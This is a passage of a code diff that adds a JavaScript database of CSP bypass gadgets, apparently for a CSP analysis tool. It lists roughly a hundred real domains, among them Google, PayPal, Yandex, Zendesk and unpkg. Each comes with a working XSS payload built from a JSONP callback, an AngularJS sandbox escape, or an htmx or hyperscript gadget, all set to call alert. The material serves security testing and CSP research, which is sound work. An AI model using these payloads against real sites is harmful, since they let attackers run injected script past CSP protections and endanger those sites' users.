+    { domain: "secure.gravatar.com", code: `<script src="https://secure.gravatar.com/930fc2e7cd239606c398bff5b5fc12e7.json?callback=alert"></script>` },
+    { domain: "securepubads.g.doubleclick.net", code: `<script src="https://securepubads.g.doubleclick.net/gampad/ads?gdfp_req=1&output=json_html&iu=%2F32173961%2Fdesktop%2Ffrontpage%2Flisting&sz=300x250&url=https%3A%2F%2Fwww.reddit.com%2F&vrg=147&callback=alert"></script>` },
+    { domain: "server.ethicalads.io", code: `<script src="https://server.ethicalads.io/api/v1/decision/?publisher=jsbin&ad_types=x&format=jsonp&div_ids=x&callback=alert(1)-"></script>` },
+    { domain: "sharethis.com", code: `<script src="https://sharethis.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "shop.samsung.com", code: `<script src="https://shop.samsung.com/br/_v/private/ng/p4v1/getCartCount?callback=alert"></script>` },
+    { domain: "smaato.com", code: `<script src="https://smaato.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "smartcaptcha.yandexcloud.net", code: `<script src="https://smartcaptcha.yandexcloud.net/captcha.js?render=onload&onload=alert"></script>` },
+    { domain: "social.invicti.com", code: `<script src="https://social.invicti.com/ping?callback=alert(1)"></script>` },
+    { domain: "social.yandex.ru", code: `<script src="https://social.yandex.ru/providers.jsonp?callback=alert"></script>` },
+    { domain: "soundcloud.com", code: `<script src="https://soundcloud.com/oembed?format=js&callback=alert&url=https://soundcloud.com/rich-the-kid/plug-walk-1"></script>` },
+    { domain: "speller.yandex.net", code: `<script src="https://speller.yandex.net/services/spellservice.json/checkText?text=123&callback=alert(1)"></script>` },
+    { domain: "srv.buysellads.com", code: `<script src="https://srv.buysellads.com/ads/CEBICK3M.json?callback=alert"></script>` },
+    { domain: "srv.carbonads.net", code: `<script src="https://srv.carbonads.net/ads/x.json?callback=alert"></script>` },
+    { domain: "ssl.gstatic.com", code: `<body ng-app ng-csp><script src="//ssl.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="\$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>` },
+    { domain: "sso.bytedance.com", code: `<script src="https://sso.bytedance.com/watermark/?callback=alert"></script>` },
+    { domain: "st3.zoom.us", code: `<script src="https://st3.zoom.us/static/6.2.7600/js/lib/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=\$event.target.ownerDocument.defaultView;window.alert(window.origin);">` },
+    { domain: "static.parastorage.com", code: `<body ng-app ng-csp><script src="https://static.parastorage.com/services/third-party/angularjs/1.4.5/angular.min.js"></script><input autofocus ng-focus="\$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>` },
+    { domain: "statics.teams.cdn.office.net", code: `<script src=https://statics.teams.cdn.office.net/hashed/0.2-angular-jquery.min-eee9041.js></script><div ng-app>{{x={"n":"".constructor.prototype};x["n"].charAt=[].join;\$eval("x=alert(1)");}}</div>` },
+    { domain: "storemapper-herokuapp-com.global.ssl.fastly.net", code: `<script src="https://storemapper-herokuapp-com.global.ssl.fastly.net/api/users/9223/stores.js?callback=alert(1)-"></script>` },
+    { domain: "suggestqueries-clients6.youtube.com", code: `<script src="https://suggestqueries-clients6.youtube.com/complete/search?client=youtube&q=\$query&callback=alert"></script>` },
+    { domain: "support.zendesk.com", code: `<script src="https://support.zendesk.com/accounts/reminder?callback=alert(window.location)//"></script>` },
+    { domain: "sync.im-apps.net", code: `<script src="https://sync.im-apps.net/imid/segment?callback=alert(1)&token=VXoW9wEaCAYxiIkb8Mzm7Q"></script>` },
+    { domain: "tagmanager.google.com", code: `<script src="https://tagmanager.google.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>` },
+    { domain: "tebilisim.com", code: `<script src="https://tebilisim.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "termly.io", code: `<script src="https://termly.io/wp-json?_jsonp=alert"></script>` },
+    { domain: "thebrave.io", code: `<script src="https://thebrave.io/wp-json?_jsonp=alert"></script>` },
+    { domain: "thiscanbeanything.zendesk.com", code: `<script src="https://thiscanbeanything.zendesk.com/sc/faye/?message=[{%22channel%22:%22%22}]&jsonp=alert"></script>` },
+    { domain: "tlx.3lift.com", code: `<script src=https://tlx.3lift.com/header/auction?callback=alert(1)></script>` },
+    { domain: "tr.indeed.com", code: `<script src="https://tr.indeed.com/m/newjobs?q=&l=&ts=1734358724474&callback=alert"></script>` },
+    { domain: "tr.snapchat.com", code: `<script src="https://tr.snapchat.com/config/com/%27%29%3B%7Dcatch%28e%29%7B%7D%7D%3Balert%281%29%3B%21function%28%29%7Btry%7B%28%27.js"></script>` },
+    { domain: "track.consensus.app", code: `<script src="https://track.consensus.app/track/?callback=alert(1)"></script>` },
+    { domain: "translate-pa.googleapis.com", code: `<script src="https://translate-pa.googleapis.com/v1/supportedLanguages?callback=alert(1)"></script>` },
+    { domain: "translate.google.com", code: `<script src="https://translate.google.com/translate_a/element.js?cb=alert"></script>` },
+    { domain: "translate.googleapis.com", code: `<script src="https://translate.googleapis.com/\$discovery/rest?version=v3&callback=alert();"></script>` },
+    { domain: "trustarc.com", code: `<script src="https://trustarc.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "typekit.com", code: `<script src="https://typekit.com/api/v1/json/libraries/full?callback=alert"></script>` },
+    { domain: "udgnoz7mccyaowzp.public.blob.vercel-storage.com", code: `<script src="https://udgnoz7mccyaowzp.public.blob.vercel-storage.com/a-LAZhjxXucrzBiROqCt4bsY3n6srlWP.js"></script>` },
+    { domain: "ug.alibaba.com", code: `<script src="https://ug.alibaba.com/api/ship/read?callback=alert"></script>` },
+    { domain: "uk.indeed.com", code: `<script src="https://uk.indeed.com/m/newjobs?callback=alert"></script>` },
+    { domain: "ulogin.ru", code: `<script src="https://ulogin.ru/token.php?callback=alert(1337)"></script>` },
+    { domain: "unpkg.com", code: `<script src="https://unpkg.com/htmx.org"></script><any hx-trigger="x[1)}),alert(origin)//]">` },
+    { domain: "unpkg.com", code: `<script src="https://unpkg.com/hyperscript.org"></script><x _="on load alert(1)">` },
+    { domain: "urs.pbs.org", code: `<script src="https://urs.pbs.org/redirect/1/?format=jsonp&callback=alert(1)"></script>` },
+    { domain: "usercentrics.eu", code: `<script src="https://usercentrics.eu/wp-json?_jsonp=alert"></script>` },
+    { domain: "vidyome.com", code: `<script src="https://vidyome.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "vimeo.com", code: `<script src="https://vimeo.com/api/v2/video/1006042481.json?callback=alert"></script>` },
+    { domain: "visitor-service.tealiumiq.com", code: `<script src="https://visitor-service.tealiumiq.com/northwesternmutual/main/q?callback=alert(1)"></script>` },
+    { domain: "visualwebsiteoptimizer.com", code: `<script src="https://visualwebsiteoptimizer.com/wp-json/wp/v2/posts/?_jsonp=alert"></script>` },
+    { domain: "wb.amap.com", code: `<script src="https://wb.amap.com/channel.php?callback=alert"></script>` },
+    { domain: "widget.usersnap.com", code: `<script src="https://widget.usersnap.com/load/d5abc654-0976-45b9-8074-fa5e721db433?onload=alert"></script>` },
+    { domain: "widgets.pinterest.com", code: `<script src="https://widgets.pinterest.com/v3/pidgets/boards/ciciwin/hedgehog-squirrel-crafts/pins/?callback=alert"></script>` },
+    { domain: "wikipedia.org", code: `<script src="https://en.wikipedia.org/w/api.php?action=opensearch&format=json&limit=5&callback=alert&search=renniepak"></script>` },
+    { domain: "wordpress.org", code: `<script src="https://wordpress.org/wp-json/wp/v2/posts/?_jsonp=alert"></script>` },
+    { domain: "wse.api.here.com", code: `<script src="https://wse.api.here.com/v8/findsequence2?apiKey=<valid-api-key-here>&jsonCallback=alert(origin);void&mode=TransportModes"></script>` },
+    { domain: "www-api.ibm.com", code: `<script src="https://www-api.ibm.com/search/typeahead/v1?lang=en&cc=us&query=l&callback=alert"></script>` },
+    { domain: "www.abtasty.com", code: `<script src="https://www.abtasty.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "www.adpushup.com", code: `<script src="https://www.adpushup.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "www.altmetric.com", code: `<script src="https://www.altmetric.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "www.ancestrycdn.com", code: `<body ng-app ng-csp><script src="https://www.ancestrycdn.com/ui-static/lib/angular/1.2.3/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=\$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>` },
+    { domain: "www.appointlet.com", code: `<script src="https://www.appointlet.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "www.bazaarvoice.com", code: `<script src="https://www.bazaarvoice.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "www.bing.com", code: `<script src="https://www.bing.com/api/maps/mapcontrol?key=AlSfV3wSTlPFqxEdS97v1d1ZK25Qg4OxZerOAjFYQPZwtY4bQqhz4jDRou_kCmbJ&callback=alert"></script>` },
+    { domain: "www.cookiebot.com", code: `<script src="https://www.cookiebot.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "www.criteo.com", code: `<script src="https://www.criteo.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "www.demandbase.com", code: `<script src="https://www.demandbase.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "www.ecwid.com", code: `<script src="https://www.ecwid.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "www.google-analytics.com", code: `<script src="https://www.google-analytics.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>` },
+    { domain: "www.google.com", code: `<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='\$event.target.ownerDocument.defaultView.alert(1)'>` },
+    { domain: "www.googleapis.com", code: `<script src="https://www.googleapis.com/blogger/v3/blogs/1/posts/1?callback=alert(1)"></script>` },
+    { domain: "www.googleapis.com", code: `<script src="https://www.googleapis.com/books/v1/volumes?q=bug+bounty&callback=alert(1)"></script>` },
+    { domain: "www.googleapis.com", code: `<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>` },
+    { domain: "www.googletagmanager.com", code: `<script src="https://www.googletagmanager.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>` },
+    { domain: "www.gstatic.com", code: `<body ng-app ng-csp><script src="//www.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="\$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>` },
+    { domain: "www.gstatic.com", code: `<script src='https://www.gstatic.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='\$event.target.ownerDocument.defaultView.alert(1)'>` },
+    { domain: "www.hcaptcha.com", code: `<script src="https://www.hcaptcha.com/1/api.js?onload=alert&render=explicit"></script>` },
+    { domain: "www.indexexchange.com", code: `<script src="https://www.indexexchange.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "www.ipinfo.io", code: `<script src="https://www.ipinfo.io/?format=jsonp&callback=alert"></script>` },
+    { domain: "www.meteoprog.ua", code: `<script src="https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)"></script>` },
+    { domain: "www.microsoft.com", code: `<script src="https://www.microsoft.com/en-us/research/wp-json?_jsonp=alert"></script>` },
+    { domain: "www.paypal.com", code: `<script src="https://www.paypal.com/checkoutnow/remembered?callback=alert"></script>` },
+    { domain: "www.paytr.com", code: `<script src="https://www.paytr.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "www.readspeaker.com", code: `<script src="https://www.readspeaker.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "www.recaptcha.net", code: `<script src="https://www.recaptcha.net/recaptcha/api.js?onload=alert"></script>` },
+    { domain: "www.reddit.com", code: `<script src="https://www.reddit.com/.json?limit=1&jsonp=alert"></script>` },
+    { domain: "www.reklamstore.com", code: `<script src="https://www.reklamstore.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "www.sanalofisonline.com", code: `<script src="https://www.sanalofisonline.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "www.sovrn.com", code: `<script src="https://www.sovrn.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "www.st.com", code: `<body ng-app ng-csp><script src="https://www.st.com/etc/clientlibs/st-search-cx/stangularjs.min.d9f5c8180af41b5cae710870b6b018fe.js"></script><input autofocus ng-focus="\$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>` },
+    { domain: "www.thebrave.io", code: `<script src="https://www.thebrave.io/wp-json?_jsonp=alert"></script>` },
+    { domain: "www.vidyome.com", code: `<script src="https://www.vidyome.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "www.wildapricot.com", code: `<script src="https://www.wildapricot.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "www.yastat.net", code: `<script src="https://www.yastat.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=\$event.target.ownerDocument.defaultView;window.alert(window.origin);">` },
+    { domain: "www.yastatic.net", code: `<script src="https://www.yastatic.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=\$event.target.ownerDocument.defaultView;window.alert(window.origin);">` },
+    { domain: "yandex.st", code: `<script src="https://yandex.st/jquery/1.8.2/jquery.min.js"></script><script src="https://yandex.st/bootstrap/3.0.3/js/bootstrap.min.js"></script><button data-toggle="modal" data-target="\$('head').html('<script>alert(1)</script>')">Test XSS</button>` },
+    { domain: "yastat.net", code: `<script src="https://yastat.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=\$event.target.ownerDocument.defaultView;window.alert(window.origin);">` },
+    { domain: "yastatic.net", code: `<script src="https://yastatic.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=\$event.target.ownerDocument.defaultView;window.alert(window.origin);">` },
+    { domain: "yoast.com", code: `<script src="https://yoast.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "yuedust.yuedu.126.net", code: `<body ng-app ng-csp><script src="//yuedust.yuedu.126.net/js/components/angular/angular.js"></script><div ng-app ng-csp><div ng-focus="x=\$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>` },
+    { domain: "yugiohmonstrosdeduelo.blogspot.com", code: `<script src="https://yugiohmonstrosdeduelo.blogspot.com/feeds/posts/summary?callback=alert"></script>` },
+    { domain: "zhike.help.360.cn", code: `<script src="https://zhike.help.360.cn/api/v1/robotWindow?callback=alert(1)-"></script>` }
+];
 
 // Export for use in other modules
-if (typeof module !== 'undefined' && module.exports) {
-  module.exports = { cspBypassDatabase, CSPAnalyzer };
+if (typeof module !== "undefined" && module.exports) {
+    module.exports = { CSP_BYPASS_DATABASE };
 }
